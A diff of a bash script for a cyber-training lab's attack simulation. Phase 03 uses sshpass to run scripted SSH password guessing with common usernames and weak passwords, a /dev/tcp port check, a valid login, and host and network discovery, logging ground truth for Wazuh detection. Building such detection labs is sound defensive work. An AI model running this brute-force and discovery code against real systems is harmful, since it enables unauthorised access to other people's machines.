@@ -4,294 +4,294 @@
 # Nordic Manufacturing A/S - Attack Simulation
 # Phase 03 - Authentication / Initial Access
 #
-# Purpose:
-#   Generate controlled SSH authentication activity:
+# MANUAL:
+#   ./03-auth.sh
 #
-#     1. Failed SSH login attempts
-#     2. Successful SSH login
-#     3. Basic post-login discovery
-#
-# Evidence:
-#   - Failed SSH authentication
-#   - Multiple usernames
-#   - Successful SSH authentication
-#   - Remote session
-#   - Commands executed after login
-#
-# IMPORTANT:
-#   Intended for the Nordic Manufacturing CyberLab only.
+# AUTOMATIC:
+#   NORDIC_AUTO=1
+#   NORDIC_COMPROMISED_HOST=192.168.1.20
+#   NORDIC_SSH_USER=student
+#   NORDIC_SSH_PASSWORD=password
+#   ./03-auth.sh
 # ============================================================
 
 set -u
 
-BASE_DIR="/opt/nordic-attack"
-LOG_DIR="$BASE_DIR/logs"
-
+LOG_DIR="/opt/nordic-attack/logs"
 mkdir -p "$LOG_DIR"
 
 TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
-LOGFILE="$LOG_DIR/auth-$TIMESTAMP.log"
-GROUNDTRUTH="$LOG_DIR/incident-ground-truth.log"
+INCIDENT_ID="${NORDIC_INCIDENT_ID:-MANUAL-$TIMESTAMP}"
+LOG_FILE="$LOG_DIR/${INCIDENT_ID}-03-auth.log"
 
-
-# ------------------------------------------------------------
-# Functions
-# ------------------------------------------------------------
-
-log_event() {
-    echo "$(date --iso-8601=seconds) | AUTH | $1" >> "$GROUNDTRUTH"
-}
-
-banner() {
-    clear
-    echo "============================================================"
-    echo "       NORDIC MANUFACTURING - AUTH ATTACK"
-    echo "============================================================"
-    echo
-}
-
+echo "======================================================"
+echo " Nordic Manufacturing - Phase 03: Initial Access"
+echo "======================================================"
+echo
 
 # ------------------------------------------------------------
-# Check dependencies
+# Dependency check
 # ------------------------------------------------------------
-
-if ! command -v ssh >/dev/null 2>&1; then
-    echo "[ERROR] ssh client is not installed."
-    exit 1
-fi
 
 if ! command -v sshpass >/dev/null 2>&1; then
     echo "[ERROR] sshpass is not installed."
     echo
     echo "Install with:"
-    echo "  sudo apt install sshpass"
+    echo "  sudo apt update"
+    echo "  sudo apt install -y sshpass"
     exit 1
 fi
 
-
 # ------------------------------------------------------------
-# Start
-# ------------------------------------------------------------
-
-banner
-
-echo "This simulation generates failed and successful"
-echo "SSH authentication events against a CyberLab host."
-echo
-
-read -rp "Target IP: " TARGET
-
-
-# ------------------------------------------------------------
-# Validate IPv4
+# AUTO / MANUAL input
 # ------------------------------------------------------------
 
-if [[ -z "$TARGET" ]]; then
-    echo "[ERROR] No target specified."
-    exit 1
-fi
+if [[ "${NORDIC_AUTO:-0}" == "1" ]]; then
 
-if ! [[ "$TARGET" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
-    echo "[ERROR] Invalid IPv4 address."
-    exit 1
-fi
-
-IFS='.' read -r o1 o2 o3 o4 <<< "$TARGET"
-
-for octet in "$o1" "$o2" "$o3" "$o4"; do
-    if (( octet < 0 || octet > 255 )); then
-        echo "[ERROR] Invalid IPv4 address."
+    if [[ -z "${NORDIC_COMPROMISED_HOST:-}" ]]; then
+        echo "[ERROR] NORDIC_COMPROMISED_HOST is not set."
         exit 1
     fi
-done
 
+    if [[ -z "${NORDIC_SSH_USER:-}" ]]; then
+        echo "[ERROR] NORDIC_SSH_USER is not set."
+        exit 1
+    fi
 
-# ------------------------------------------------------------
-# Credentials for successful compromise simulation
-# ------------------------------------------------------------
+    if [[ -z "${NORDIC_SSH_PASSWORD:-}" ]]; then
+        echo "[ERROR] NORDIC_SSH_PASSWORD is not set."
+        exit 1
+    fi
 
-echo
-read -rp "Valid SSH username: " VALID_USER
-read -rsp "Valid SSH password: " VALID_PASSWORD
-echo
+    TARGET="$NORDIC_COMPROMISED_HOST"
+    SSH_USER="$NORDIC_SSH_USER"
+    SSH_PASSWORD="$NORDIC_SSH_PASSWORD"
 
-if [[ -z "$VALID_USER" || -z "$VALID_PASSWORD" ]]; then
-    echo
-    echo "[ERROR] Username/password cannot be empty."
-    exit 1
-fi
-
-
-echo
-echo "Target: $TARGET"
-echo "User:   $VALID_USER"
-echo
-
-log_event "Authentication attack started against $TARGET"
-
-
-{
-    echo "============================================================"
-    echo "Nordic Manufacturing - Authentication Attack"
-    echo "============================================================"
-    echo
-    echo "Time:   $(date --iso-8601=seconds)"
-    echo "Source: $(hostname)"
-    echo "Target: $TARGET"
-    echo "User:   $VALID_USER"
-    echo
-} >> "$LOGFILE"
-
-
-# ------------------------------------------------------------
-# Phase 1 - Failed SSH attempts
-# ------------------------------------------------------------
-
-echo "[1/3] Generating failed SSH authentication attempts..."
-
-FAILED_USERS=(
-    "admin"
-    "administrator"
-    "backup"
-    "support"
-    "service"
-)
-
-FAILED_PASSWORD="Winter2026!"
-
-for USERNAME in "${FAILED_USERS[@]}"; do
-
-    echo "      Trying user: $USERNAME"
-
-    log_event "Failed SSH attempt against $TARGET using username $USERNAME"
-
-    sshpass -p "$FAILED_PASSWORD" \
-        ssh \
-        -o StrictHostKeyChecking=no \
-        -o UserKnownHostsFile=/dev/null \
-        -o PreferredAuthentications=password \
-        -o PubkeyAuthentication=no \
-        -o ConnectTimeout=5 \
-        -o NumberOfPasswordPrompts=1 \
-        "$USERNAME@$TARGET" \
-        "exit" >> "$LOGFILE" 2>&1 || true
-
-    sleep 2
-
-done
-
-
-# ------------------------------------------------------------
-# Extra attempts against the valid username
-# ------------------------------------------------------------
-
-echo
-echo "[2/3] Attempting password guesses against valid account..."
-
-for PASSWORD in \
-    "Password123!" \
-    "Welcome2026!" \
-    "Company2026!"
-do
-
-    echo "      Password guess against: $VALID_USER"
-
-    log_event "Password guess against $VALID_USER@$TARGET"
-
-    sshpass -p "$PASSWORD" \
-        ssh \
-        -o StrictHostKeyChecking=no \
-        -o UserKnownHostsFile=/dev/null \
-        -o PreferredAuthentications=password \
-        -o PubkeyAuthentication=no \
-        -o ConnectTimeout=5 \
-        -o NumberOfPasswordPrompts=1 \
-        "$VALID_USER@$TARGET" \
-        "exit" >> "$LOGFILE" 2>&1 || true
-
-    sleep 2
-
-done
-
-
-# ------------------------------------------------------------
-# Phase 3 - Successful authentication
-# ------------------------------------------------------------
-
-echo
-echo "[3/3] Performing successful authentication..."
-
-log_event "Successful SSH authentication attempted as $VALID_USER against $TARGET"
-
-sshpass -p "$VALID_PASSWORD" \
-    ssh \
-    -o StrictHostKeyChecking=no \
-    -o UserKnownHostsFile=/dev/null \
-    -o PreferredAuthentications=password \
-    -o PubkeyAuthentication=no \
-    -o ConnectTimeout=5 \
-    "$VALID_USER@$TARGET" \
-    '
-        echo "===== POST LOGIN DISCOVERY ====="
-        echo
-        echo "[whoami]"
-        whoami
-        echo
-        echo "[hostname]"
-        hostname
-        echo
-        echo "[id]"
-        id
-        echo
-        echo "[network]"
-        ip addr
-        echo
-        echo "[logged in users]"
-        who
-    ' >> "$LOGFILE" 2>&1
-
-SSH_RESULT=$?
-
-
-# ------------------------------------------------------------
-# Result
-# ------------------------------------------------------------
-
-if [[ "$SSH_RESULT" -eq 0 ]]; then
-
-    log_event "Successful SSH session established as $VALID_USER on $TARGET"
-
-    echo
-    echo "[+] Successful SSH session established."
+    echo "[AUTO MODE]"
+    echo "Target : $TARGET"
+    echo "User   : $SSH_USER"
 
 else
 
-    log_event "Successful SSH simulation FAILED against $TARGET"
+    echo "[MANUAL MODE]"
 
+    read -rp "SSH target IP: " TARGET
+    read -rp "Valid SSH username: " SSH_USER
+    read -rsp "Valid SSH password: " SSH_PASSWORD
     echo
-    echo "[ERROR] Valid SSH login failed."
-    echo "Check username/password and SSH configuration."
 
 fi
 
+# ------------------------------------------------------------
+# Validation
+# ------------------------------------------------------------
+
+if [[ -z "$TARGET" || -z "$SSH_USER" || -z "$SSH_PASSWORD" ]]; then
+    echo "[ERROR] Target, username and password are required."
+    exit 1
+fi
+
+echo
+echo "[*] Incident ID : $INCIDENT_ID"
+echo "[*] Target      : $TARGET"
+echo "[*] Valid user  : $SSH_USER"
+echo "[*] Log         : $LOG_FILE"
+echo
+
+{
+    echo "Incident ID: $INCIDENT_ID"
+    echo "Phase: AUTHENTICATION / INITIAL ACCESS"
+    echo "Timestamp: $(date --iso-8601=seconds)"
+    echo "Target: $TARGET"
+    echo "Valid user: $SSH_USER"
+    echo
+} >> "$LOG_FILE"
 
 # ------------------------------------------------------------
-# Finish
+# Check SSH
 # ------------------------------------------------------------
 
-log_event "Authentication phase completed against $TARGET"
+echo "[1/4] Checking TCP/22..."
+
+if timeout 3 bash -c "echo >/dev/tcp/$TARGET/22" 2>/dev/null; then
+    echo "[+] SSH appears reachable."
+else
+    echo "[ERROR] TCP/22 is not reachable on $TARGET."
+    exit 1
+fi
 
 echo
-echo "============================================================"
-echo " Authentication simulation completed"
-echo "============================================================"
+sleep 2
+
+# ------------------------------------------------------------
+# Failed authentication attempts
+# ------------------------------------------------------------
+
+echo "[2/4] Generating failed SSH authentication attempts..."
 echo
-echo "Target:"
-echo "  $TARGET"
+
+FAILED_USERS=(
+    "administrator"
+    "backup"
+    "service"
+    "support"
+    "$SSH_USER"
+)
+
+FAILED_PASSWORDS=(
+    "Password123!"
+    "Welcome123"
+    "Nordic2026!"
+    "Summer2026!"
+    "WrongPassword!"
+)
+
+for i in "${!FAILED_USERS[@]}"; do
+
+    USER="${FAILED_USERS[$i]}"
+    PASS="${FAILED_PASSWORDS[$i]}"
+
+    echo "[>] Failed login attempt: $USER@$TARGET"
+
+    sshpass -p "$PASS" \
+        ssh \
+        -o StrictHostKeyChecking=no \
+        -o UserKnownHostsFile=/dev/null \
+        -o ConnectTimeout=3 \
+        -o PreferredAuthentications=password \
+        -o PubkeyAuthentication=no \
+        "$USER@$TARGET" \
+        "exit" >/dev/null 2>&1 || true
+
+    echo "[$(date --iso-8601=seconds)] FAILED SSH LOGIN user=$USER target=$TARGET" \
+        >> "$LOG_FILE"
+
+    sleep 2
+
+done
+
 echo
-echo "Attack log:"
-echo "  $LOGFILE"
+echo "[+] Failed authentication activity generated."
 echo
-echo "Ground truth:"
-echo "  $GROUNDTRUTH"
+
+# ------------------------------------------------------------
+# Successful login
+# ------------------------------------------------------------
+
+echo "[3/4] Attempting successful authentication..."
+echo
+
+REMOTE_OUTPUT=$(sshpass -p "$SSH_PASSWORD" \
+    ssh \
+    -o StrictHostKeyChecking=no \
+    -o UserKnownHostsFile=/dev/null \
+    -o ConnectTimeout=5 \
+    -o PreferredAuthentications=password \
+    -o PubkeyAuthentication=no \
+    "$SSH_USER@$TARGET" \
+    '
+        echo "=== INITIAL ACCESS ==="
+        echo "USER:"
+        whoami
+        echo
+        echo "HOSTNAME:"
+        hostname
+        echo
+        echo "IDENTITY:"
+        id
+        echo
+        echo "NETWORK:"
+        ip -brief address 2>/dev/null || true
+        echo
+        echo "LOGGED IN USERS:"
+        who 2>/dev/null || true
+    ' 2>/dev/null)
+
+SSH_RESULT=$?
+
+if [[ $SSH_RESULT -ne 0 ]]; then
+    echo "[ERROR] Successful login failed."
+    echo
+    echo "Check:"
+    echo "  - Username"
+    echo "  - Password"
+    echo "  - SSH password authentication"
+    echo "  - Firewall"
+    exit 1
+fi
+
+echo "[+] Authentication successful."
+echo
+echo "$REMOTE_OUTPUT"
+
+{
+    echo
+    echo "SUCCESSFUL LOGIN"
+    echo "Timestamp: $(date --iso-8601=seconds)"
+    echo "User: $SSH_USER"
+    echo "Target: $TARGET"
+    echo
+    echo "$REMOTE_OUTPUT"
+} >> "$LOG_FILE"
+
+# ------------------------------------------------------------
+# Post-login activity
+# ------------------------------------------------------------
+
+echo
+echo "[4/4] Generating basic post-login activity..."
+
+sshpass -p "$SSH_PASSWORD" \
+    ssh \
+    -o StrictHostKeyChecking=no \
+    -o UserKnownHostsFile=/dev/null \
+    "$SSH_USER@$TARGET" \
+    '
+        whoami >/dev/null
+        hostname >/dev/null
+        id >/dev/null
+        ip route >/dev/null 2>&1
+        ip neigh >/dev/null 2>&1
+    ' >/dev/null 2>&1 || true
+
+echo "[+] Post-login discovery activity generated."
+
+# ------------------------------------------------------------
+# Ground truth
+# ------------------------------------------------------------
+
+{
+    echo
+    echo "=================================================="
+    echo "GROUND TRUTH"
+    echo "=================================================="
+    echo "Incident: $INCIDENT_ID"
+    echo "Phase: AUTHENTICATION / INITIAL ACCESS"
+    echo "Source: $(hostname)"
+    echo "Target: $TARGET"
+    echo "Compromised account: $SSH_USER"
+    echo
+    echo "Simulated activity:"
+    echo "- Multiple failed SSH authentications"
+    echo "- Failed login against valid account"
+    echo "- Successful SSH authentication"
+    echo "- Basic host/network discovery after login"
+    echo
+    echo "Expected evidence:"
+    echo "- sshd/authentication logs"
+    echo "- Wazuh authentication alerts"
+    echo "- Source IP from AttackVM"
+    echo "- Successful SSH session"
+    echo "=================================================="
+} >> "$LOG_FILE"
+
+echo
+echo "======================================================"
+echo " Phase 03 complete - Initial Access established"
+echo "======================================================"
+echo
+echo "Target       : $TARGET"
+echo "Account      : $SSH_USER"
+echo "Incident ID  : $INCIDENT_ID"
+echo "Ground truth : $LOG_FILE"
 echo
